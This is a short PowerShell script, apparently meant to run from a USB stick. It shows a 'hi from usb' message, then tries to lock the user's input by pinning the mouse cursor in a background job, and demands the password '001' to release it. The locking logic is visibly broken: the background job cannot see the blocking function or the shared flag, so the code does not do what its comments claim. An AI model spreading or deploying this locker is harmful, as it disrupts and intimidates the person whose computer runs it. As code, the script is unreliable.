try {
    Add-Type -AssemblyName PresentationFramework -ErrorAction Stop
    [System.Windows.MessageBox]::Show('hi from usb') | Out-Null
} catch {
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        [System.Windows.Forms.MessageBox]::Show('hi from usb') | Out-Null
    } catch {
        $shell = New-Object -ComObject WScript.Shell
        $shell.Popup('hi from usb', 0, 'Message', 0) | Out-Null
    }
}

# Блокировка ввода
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Функция блокировки мыши и клавиатуры (только цифры + Enter)
function Block-Input {
    $global:Blocked = $true
    while ($global:Blocked) {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)
        Start-Sleep -Milliseconds 10
    }
}

# Запуск блокировки в фоне
$blockJob = Start-Job -ScriptBlock { Block-Input }

# Окно ввода пароля
Add-Type -AssemblyName Microsoft.VisualBasic
$result = [Microsoft.VisualBasic.Interaction]::InputBox("Enter pass:", "Password Required", "")

if ($result -eq "001") {
    $global:Blocked = $false
    Stop-Job $blockJob
    Remove-Job $blockJob
    [System.Windows.Forms.MessageBox]::Show("Access granted!") | Out-Null
} else {
    [System.Windows.Forms.MessageBox]::Show("Wrong password! System remains locked.") | Out-Null
    # Продолжаем блокировку
}
